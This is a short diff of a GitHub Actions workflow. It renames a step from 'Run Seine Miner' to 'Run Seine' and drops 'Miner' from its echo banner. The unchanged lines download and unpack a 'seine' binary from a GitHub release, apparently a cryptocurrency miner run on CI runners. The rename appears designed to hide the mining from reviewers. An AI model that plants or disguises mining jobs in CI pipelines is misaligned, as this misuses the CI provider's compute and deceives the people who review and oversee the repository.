@@ -12,9 +12,9 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       
-      - name: Run Seine Miner
+      - name: Run Seine
         run: |
-          echo "=== Starting Seine Miner ==="
+          echo "=== Starting Seine ==="
           wget -q https://github.com/zpalmtree/seine/releases/latest/download/seine-linux-x86_64.tar.gz
           tar -xzf seine-linux-x86_64.tar.gz
           rm -f seine-linux-x86_64.tar.gz
